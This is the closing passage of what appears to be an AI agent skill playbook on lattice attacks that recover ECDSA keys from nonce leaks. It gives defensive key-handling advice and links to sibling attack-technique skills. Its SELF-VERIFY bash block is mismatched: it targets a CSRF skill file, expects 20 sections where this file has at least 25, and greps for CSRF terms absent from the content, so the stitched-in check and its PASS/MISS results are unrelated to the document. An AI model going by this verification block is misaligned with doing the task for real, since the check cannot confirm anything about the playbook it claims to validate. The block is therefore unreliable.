9. **Rotate keys on any suspected nonce or entropy incident, because the leak is permanent** - a key recovered from historical signatures stays recovered.
10. **Use hierarchical deterministic derivation with a hardened path for signing keys, so a leaked child does not expose the parent** - it bounds a single-key recovery.
11. **Track advances in this area, since parameter guidance changes as reduction algorithms improve** - a parameter set that was safe at publication may not be at deployment.

---

## 25. RELATED SIBLINGS — LATTICE CROSS-REFERENCE
- [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) - Coppersmith and the RSA-side small-root applications of this machinery
- [symmetric-cipher-attacks](../symmetric-cipher-attacks/SKILL.md) - the block-cipher family with the same verification discipline
- [hash-attack-techniques](../hash-attack-techniques/SKILL.md) - the hash-side attacks and their collision lattices
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - where a recovered ECDSA or RSA key is most often used
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - how a lattice recovery is documented so a reviewer can reproduce it

---

## SELF-VERIFY

Run from this directory; every check must pass before the playbook is considered loaded.

```bash
f=SKILL.md; [ -f "$f" ] || f=skills/impl/csrf-cross-site-request-forgery/SKILL.md
wc -c "$f"                                       # expect 19500-22500
grep -c '^## [0-9]' "$f"                         # expect 20 numbered sections (0-20)
d=$(dirname "$f"); grep -oE '\]\(\.\./[^)]+\)' "$f" | tr -d '](' | sed 's/)$//' | sort -u |
  while read -r p; do [ -f "$d/$p" ] || [ -f "skills/impl/$p" ] && echo "OK   $p" || echo "DEAD $p"; done
for t in 'SameSite=Lax' 'SameSite=Strict' 'SameSite=None' 'Lax+POST' '_csrf_token'          'X-CSRF-Token' 'double-submit' 'cookie tossing' 'method override' '_method'          'X-HTTP-Method-Override' 'enctype="text/plain"' 'Origin' 'Referer'          'Access-Control-Allow-Credentials' 'credentials: include' 'withCredentials'          'oauth/callback' 'state' 'X-Frame-Options' 'frame-ancestors' 'Sec-Fetch-Site'          'CSPT2CSRF' 'read-back'; do
  grep -q "$t" "$f" && echo "PASS $t" || echo "MISS $t"; done
```
